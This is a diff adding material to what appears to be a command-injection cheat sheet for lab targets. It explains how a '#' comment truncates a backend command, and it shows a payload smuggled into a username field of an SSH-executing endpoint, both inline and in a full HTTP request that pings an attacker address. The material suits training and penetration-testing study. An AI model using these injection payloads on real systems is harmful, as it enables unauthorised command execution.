@@ -40,8 +40,44 @@ ls vs dir
 | `\|\|` | `%7c%7c` | 2nd (only if 1st fails) |
 | `` ` `` (backtick) | `%60%60` | Both (Linux only) |
 | `$()` | `%24%28%29` | Both (Linux only) |
+| `#` | `%23` | Truncates (Linux only) |
 
 **Note:** `;` doesn't work in Windows CMD, but works in PowerShell.
+
+---
+
+## Using # (Hash) to Truncate Commands
+
+In bash, `#` starts a comment, which means anything after it on the same line is ignored. This is extremely useful in command injection when your injected payload is concatenated with additional characters that would break your command.
+
+**Example scenario:** The backend command is:
+```bash
+/bin/bash -c 'ssh username@hostname'
+```
+
+If you inject into `username`, the `@hostname` part would break your payload. Using `#` truncates the rest:
+
+```bash
+# Injection payload
+;ping${IFS}-c4${IFS}10.10.14.157;#
+
+# Results in:
+/bin/bash -c 'ssh ;ping -c4 10.10.14.157;#@hostname'
+# The @hostname is now a comment and ignored!
+```
+
+**Real-world example:**
+
+```http
+POST /executessh HTTP/1.1
+Host: target.htb
+Content-Type: application/x-www-form-urlencoded
+Cookie: JSESSIONID=ABC123
+
+host=localhost&username=;ping${IFS}-c4${IFS}10.10.14.157;#
+```
+
+The `#` prevents the rest of the backend command from being interpreted, allowing your payload to execute cleanly.
 
 ---
 
